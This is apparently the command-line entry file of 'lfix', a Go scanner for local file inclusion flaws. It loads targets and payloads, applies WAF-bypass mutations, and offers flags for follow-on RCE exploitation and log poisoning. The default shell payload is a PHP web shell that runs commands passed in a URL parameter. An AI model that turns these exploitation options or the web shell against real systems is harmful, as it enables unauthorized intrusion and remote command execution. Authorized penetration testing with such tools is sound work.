package main

import (
	"bufio"
	_ "embed"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/Serdar715/lfix/cmd/lfix/options"
	"github.com/Serdar715/lfix/pkg/engine"
	"github.com/Serdar715/lfix/pkg/scanner"
)

const (
	AppName    = "lfix"
	Version    = "2.1.0"
	TimeFormat = "15:04:05"
	ColorReset = "\033[0m"
	ColorRed   = "\033[31m"
	ColorGreen = "\033[32m"
	ColorCyan  = "\033[36m"

	// Magic number'lar kaldırıldı - constants tanımlandı
	DefaultFilePermission = 0600
	DefaultConcurrency    = 30
	DefaultTimeout        = 7
)

// cliOptions artık options paketinden geliyor - alias oluşturuldu
type cliOptions = options.CLIOptions

// ResultWriter handles thread-safe writing to output file
type ResultWriter struct {
	file   *os.File
	mutex  sync.Mutex
	format string // "text" or "json"
}

// NewResultWriter creates a new result writer
func NewResultWriter(filename, format string) (*ResultWriter, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, DefaultFilePermission)
	if err != nil {
		return nil, err
	}
	return &ResultWriter{
		file:   f,
		format: format,
	}, nil
}

// Write writes a finding to the output file in the specified format
func (rw *ResultWriter) Write(finding *engine.Finding) {
	rw.mutex.Lock()
	defer rw.mutex.Unlock()

	if rw.format == "json" {
		jsonData, _ := json.Marshal(finding)
		rw.file.WriteString(string(jsonData) + "\n")
	} else {
		rw.file.WriteString(fmt.Sprintf("[%s] TYPE: %s | URL: %s | PAYLOAD: %s | MATCH: %s\n",
			time.Now().Format(TimeFormat), finding.Task.InjectionPoint, finding.Task.URL, finding.Task.Payload, finding.MatchInfo))
	}
}

// Close closes the result writer
func (rw *ResultWriter) Close() {
	if rw.file != nil {
		rw.file.Close()
	}
}

func main() {
	printBanner()

	o := parseFlags()

	// Validation ve defaults uygula
	o.ApplyDefaults()

	if err := o.Validate(); err != nil {
		logError("Validation error: %v", err)
		os.Exit(1)
	}

	var resultWriter *ResultWriter
	if o.OutputFile != "" {
		rw, err := NewResultWriter(o.OutputFile, o.OutputFormat)
		if err != nil {
			logError("File error: %v", err)
			return
		}
		defer rw.Close()
		resultWriter = rw
	}

	targets, err := loadTargets(o.SingleURL, o.ListFile)
	if err != nil {
		logError("Target loading error: %v", err)
		os.Exit(1)
	}
	if len(targets) == 0 {
		logError("Please provide a target (-u, -l, or piped from STDIN)")
		os.Exit(1)
	}

	payloads := loadPayloads(o.PayloadFile)

	fmt.Printf("%s[+] Method: %s | Workers: %d | Targets: %d | Payloads: %d%s\n\n",
		ColorCyan, o.Method, o.Concurrency, len(targets), len(payloads), ColorReset)

	// scanner.Options'a dönüştür
	scannerOpts := scanner.Options{
		Concurrency:           o.Concurrency,
		Timeout:               o.Timeout,
		Proxy:                 o.Proxy,
		UseMutation:           o.UseMutation,
		Calibrate:             o.Calibrate,
		Debug:                 o.Debug,
		TLSInsecureSkipVerify: o.TLSInsecureSkipVerify,
		EnableLogPoison:       o.EnableLogPoison,
		EnableRCE:             o.EnableRCE,
		ShellPayload:          o.ShellPayload,
	}
	s := scanner.NewScanner(scannerOpts)

	staticHeaders := parseHeaderSlice(o.StaticHeaders)
	findings := s.Start(targets, payloads, o.PostData, o.Method, o.TargetHeader, staticHeaders)

	// Progress tracking
	found := false
	findingsCount := 0

	if o.Verbose {
		fmt.Printf("%s[*] Starting scan...%s\n", ColorCyan, ColorReset)

		// Progress goroutine for real-time updates
		go func() {
			for range s.Progress {
				_, _, requests, findingsTotal, errors, _ := s.GetStatistics()
				fmt.Printf("\r%s[*] Progress: %d requests | Findings: %d | Errors: %d%s",
					ColorCyan, requests, findingsTotal, errors, ColorReset)
			}
		}()
	}

	for finding := range findings {
		found = true
		findingsCount++

		output := fmt.Sprintf("\n%s[VULN] [%s] Found: %s\n    URL: %s\n    Payload: %s%s",
			ColorRed, finding.Task.InjectionPoint, finding.MatchInfo, finding.Task.URL, finding.Task.Payload, ColorReset)

		if o.Verbose {
			// Print newline to not overwrite the progress line
			fmt.Println()
		}

		fmt.Println(output)

		if resultWriter != nil {
			resultWriter.Write(&finding)
		}
	}

	// Final statistics
	targetsTotal, payloadsTotal, requestsTotal, findingsTotal, errorsTotal, totalTime := s.GetStatistics()

	fmt.Println()
	if !found {
		fmt.Println(ColorGreen + "[+] Scan complete. No vulnerabilities found." + ColorReset)
	} else {
		fmt.Println(ColorGreen + "[+] Scan complete." + ColorReset)
	}

	// Print final statistics
	fmt.Printf("%s[*] Statistics:%s\n", ColorCyan, ColorReset)
	fmt.Printf("    Targets:    %d\n", targetsTotal)
	fmt.Printf("    Payloads:  %d\n", payloadsTotal)
	fmt.Printf("    Requests:  %d\n", requestsTotal)
	fmt.Printf("    Findings:  %d\n", findingsTotal)
	fmt.Printf("    Errors:    %d\n", errorsTotal)
	fmt.Printf("    Time:      %s\n", totalTime.Round(time.Second))
}

func parseFlags() cliOptions {
	o := cliOptions{}
	flag.StringVar(&o.SingleURL, "u", "", "Target URL")
	flag.StringVar(&o.ListFile, "l", "", "Target list file")
	flag.StringVar(&o.PayloadFile, "p", "", "Payload file (default: built-in)")
	flag.StringVar(&o.OutputFile, "o", "", "Output file")
	flag.StringVar(&o.OutputFormat, "of", "text", "Output format: text or json")
	flag.StringVar(&o.PostData, "data", "", "POST body data")
	flag.StringVar(&o.Method, "X", "GET", "HTTP method")
	flag.StringVar(&o.TargetHeader, "H", "", "Header to inject payload into (e.g. 'X-Path: FUZZ')")
	flag.StringVar(&o.Proxy, "proxy", "", "Proxy URL (e.g. http://127.0.0.1:8080)")
	// Magic number'lar kaldırıldı
	flag.IntVar(&o.Concurrency, "c", DefaultConcurrency, "Number of concurrent workers")
	flag.IntVar(&o.Timeout, "t", DefaultTimeout, "HTTP timeout in seconds")
	flag.BoolVar(&o.Verbose, "v", false, "Verbose output")
	flag.BoolVar(&o.Debug, "debug", false, "Debug output")
	flag.BoolVar(&o.UseMutation, "mutate", true, "Enable WAF bypass mutations")
	flag.BoolVar(&o.Calibrate, "calibrate", true, "Enable baseline calibration")
	flag.BoolVar(&o.TLSInsecureSkipVerify, "k", false, "Skip TLS certificate verification (insecure)")
	// Exploitation flags
	flag.BoolVar(&o.EnableRCE, "rce", false, "Enable RCE exploitation after LFI found")
	flag.BoolVar(&o.EnableLogPoison, "lp", false, "Enable log poisoning after LFI found")
	flag.StringVar(&o.ShellPayload, "shell", "<?php system($_GET['cmd']); ?>", "Shell payload for RCE/log poisoning")
	// -header can be specified multiple times: -header "Key: Val" -header "Key2: Val2"
	flag.Var(&o.StaticHeaders, "header", "Static request header (repeatable: -header 'K: V')")
	flag.Parse()
	return o
}

func loadTargets(singleURL, listFile string) ([]string, error) {
	// Error handling eklendi
	validator := options.NewTargetValidator()

	if singleURL != "" {
		// URL validation
		if err := validator.Validate(singleURL); err != nil {
			return nil, fmt.Errorf("invalid target URL: %w", err)
		}
		resolved, _ := validator.ResolveTarget(singleURL)
		return []string{resolved}, nil
	}

	var scanner *bufio.Scanner
	if listFile != "" {
		// FileHandler ile güvenli dosya okuma
		fileHandler := options.NewFileHandler()
		lines, err := fileHandler.ReadLines(listFile)
		if err != nil {
			return nil, fmt.Errorf("could not open target file: %w", err)
		}
		return lines, nil
	}

	// STDIN kontrolü - hata yok sayılmıyor
	stat, err := os.Stdin.Stat()
	if err != nil {
		return nil, fmt.Errorf("stdin error: %w", err)
	}
	if (stat.Mode() & os.ModeCharDevice) != 0 {
		return []string{}, nil // Boş stdin - hata değil, normal durum
	}
	scanner = bufio.NewScanner(os.Stdin)

	var targets []string
	for scanner.Scan() {
		t := strings.TrimSpace(scanner.Text())
		if t != "" && options.ValidateTargetLine(t) {
			targets = append(targets, t)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("scanner error: %w", err)
	}

	return targets, nil
}

//go:embed payload.txt
var embeddedPayloads string

func loadPayloads(filename string) []string {
	fileHandler := options.NewFileHandler()

	if filename != "" {
		lines, err := fileHandler.ReadLines(filename)
		if err != nil {
			// Hata loglanıyor ama devam ediyor - built-in payloads
			logError("Could not open payload file, using built-in: %v", err)
			lines, _ = fileHandler.ReadLinesFromReader(strings.NewReader(embeddedPayloads))
			return lines
		}
		return lines
	}

	// Built-in payloads
	lines, _ := fileHandler.ReadLinesFromReader(strings.NewReader(embeddedPayloads))
	return lines
}

// parseHeaderSlice converts repeated -header "Key: Value" flags into a map.
func parseHeaderSlice(headers options.StringSliceFlag) map[string]string {
	m := make(map[string]string, len(headers))
	for _, h := range headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			m[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	return m
}

func logError(format string, a ...interface{}) {
	fmt.Printf(ColorRed+"[!] "+format+ColorReset+"\n", a...)
}

func printBanner() {
	fmt.Printf("%s LFix v%s — LFI Scanner%s\n", ColorCyan, Version, ColorReset)
}
